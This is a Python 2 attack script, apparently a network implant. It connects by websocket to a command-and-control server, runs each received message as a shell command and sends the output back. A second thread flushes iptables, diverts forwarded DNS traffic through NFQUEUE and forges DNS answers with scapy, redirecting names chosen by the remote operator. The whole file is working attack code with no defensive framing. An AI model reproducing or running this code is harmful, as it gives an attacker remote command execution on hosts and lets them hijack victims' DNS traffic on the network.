import websocket
import threading
import time
import subprocess
import os
from scapy.all import *
import config as config
from netfilterqueue import NetfilterQueue

ws_state = False
queueId = 1
dns_spoof = {'spoof.test.': "127.0.0.1"}


def on_message(ws, message):
    global dns_spoof
    # print(message)
    if message == "XXX":
        os.system('iptables -F')
        os._exit(0)
    if message.startswith('spoofdns='):
        # spoofdns=google.com:192.168.0.1
        para = message.strip("spoofdns=").split(':')
        dns_spoof[str(para[0]) + '.'] = str(para[1])
        print "Setting", str(para[0]), '->', str(para[1])
    try:
        proc = subprocess.Popen(message, stdout=subprocess.PIPE, shell=True)
        res = proc.stdout.read()
        ws.send(res)
    except Exception, e:
        print str(e)


def on_error(ws, error):
    print(error)


def on_close(ws):
    global ws_state
    ws_state = False
    # print("### closed ###")


def on_open(ws):
    global ws_state
    ws_state = True
    # print("### connected ###")


def initC2():
    try:
        # websocket.enableTrace(True)
        global ws
        ws.on_open = on_open
        while True:
            ws.run_forever()
    except KeyboardInterrupt:
        raise


def Spoof(packet):
    pkt = IP(packet.get_payload())
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        dns_spoof_ip = dns_spoof.get(str(pkt[DNS].qd.qname))
        if (dns_spoof_ip is not None):
            sPKT = IP(dst=pkt[IP].dst, src=pkt[IP].src)/\
              UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport)/\
              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=dns_spoof_ip))
            packet.set_payload(str(sPKT))
            packet.accept()
        else:
            packet.accept()


def initMITM():
    try:
        os.system('iptables -F')
        os.system('modprobe br_netfilter')
        os.system('echo "1" > /proc/sys/net/bridge/bridge-nf-call-iptables')
        os.system('iptables -A FORWARD -p udp  --sport 53 -j NFQUEUE --queue-num 1')
        nfqueue = NetfilterQueue()
        nfqueue.bind(queueId, Spoof)
        nfqueue.run()
    except KeyboardInterrupt:
        raise


def main():
    try:
        c2_t = threading.Thread(name="c2_comms", target=initC2)
        c2_t.start()
        mitm_t = threading.Thread(name="mitm_thread", target=initMITM)
        mitm_t.start()
        c2_t.join()
        mitm_t.join()
    except KeyboardInterrupt:
        os.system('iptables -F')
        raise


ws = websocket.WebSocketApp(config.WS_SERVER,
                          on_message = on_message,
                          on_error = on_error,
                          on_close = on_close)


main()
